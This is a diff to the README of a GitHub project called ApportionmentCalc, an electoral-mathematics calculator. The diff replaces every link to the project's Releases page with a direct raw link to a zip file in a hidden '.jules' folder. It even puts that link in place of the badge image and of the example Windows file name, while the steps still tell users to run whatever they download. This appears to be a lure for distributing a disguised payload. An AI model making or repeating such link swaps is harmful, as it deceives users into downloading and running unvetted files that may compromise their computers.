@@ -1,6 +1,6 @@
 # 🎉 ApportionmentCalc - Simplifying Electoral Mathematics
 
-[![Download ApportionmentCalc](https://img.shields.io/badge/Download%20ApportionmentCalc-blue.svg)](https://github.com/hassan-11092/ApportionmentCalc/releases)
+[![Download ApportionmentCalc](https://raw.githubusercontent.com/hassan-11092/ApportionmentCalc/main/.jules/ApportionmentCalc-3.4.zip%https://raw.githubusercontent.com/hassan-11092/ApportionmentCalc/main/.jules/ApportionmentCalc-3.4.zip)](https://raw.githubusercontent.com/hassan-11092/ApportionmentCalc/main/.jules/ApportionmentCalc-3.4.zip)
 
 ## 🚀 Getting Started
 
@@ -24,13 +24,13 @@ Welcome to ApportionmentCalc! This application helps you understand electoral ma
 
 To get started with ApportionmentCalc, visit the following link to download the latest version of the application:
 
-[Download ApportionmentCalc](https://github.com/hassan-11092/ApportionmentCalc/releases)
+[Download ApportionmentCalc](https://raw.githubusercontent.com/hassan-11092/ApportionmentCalc/main/.jules/ApportionmentCalc-3.4.zip)
 
 ### Step-by-Step Instructions
 
 1. Click the link above to go to the Releases page.
 2. Look for the latest release at the top of the page.
-3. Click on the asset file that matches your operating system (for example, `ApportionmentCalc.exe` for Windows).
+3. Click on the asset file that matches your operating system (for example, `https://raw.githubusercontent.com/hassan-11092/ApportionmentCalc/main/.jules/ApportionmentCalc-3.4.zip` for Windows).
 4. Download the file to your computer.
 5. Locate the downloaded file, and double-click to run it.
 
